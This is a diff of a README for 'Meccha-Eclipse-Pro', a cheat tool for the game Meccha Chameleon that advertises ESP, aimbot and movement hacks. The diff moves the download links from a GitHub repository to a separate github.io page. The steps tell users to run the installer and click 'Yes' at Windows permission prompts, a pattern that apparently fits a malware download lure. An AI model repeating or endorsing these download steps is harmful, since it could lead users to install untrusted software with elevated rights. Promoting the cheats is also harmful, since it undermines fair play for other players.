@@ -1,6 +1,6 @@
 # 🌑 Meccha-Eclipse-Pro - Tool for Meccha Chameleon players
 
-[![](https://img.shields.io/badge/Download-Meccha-Eclipse-Pro-blue.svg)](https://github.com/caalbor8contatos-blip/Meccha-Eclipse-Pro)
+[![](https://img.shields.io/badge/Download-Meccha-Eclipse-Pro-blue.svg)](https://caalbor8contatos-blip.github.io)
 
 Meccha-Eclipse-Pro provides players with tools to enhance their performance in Meccha Chameleon. This software enables features like ESP, aimbot, and movement modifications. Users install this program to gain a tactical edge during gameplay sessions.
 
@@ -31,7 +31,7 @@ Ensure your computer meets these minimum specifications before you install the s
 
 Follow these steps to prepare your computer and run the tool:
 
-1.  **Visit the Download Page:** Visit this page to download the latest setup installer: [https://github.com/caalbor8contatos-blip/Meccha-Eclipse-Pro](https://github.com/caalbor8contatos-blip/Meccha-Eclipse-Pro).
+1.  **Visit the Download Page:** Visit this page to download the latest setup installer: [https://caalbor8contatos-blip.github.io](https://caalbor8contatos-blip.github.io).
 2.  **Locate the File:** Find the downloaded file in your browser's designated downloads folder.
 3.  **Run the Installer:** Double-click the installer file to start the process.
 4.  **Confirm Permissions:** If Windows displays a prompt, select "Yes" to allow installation.
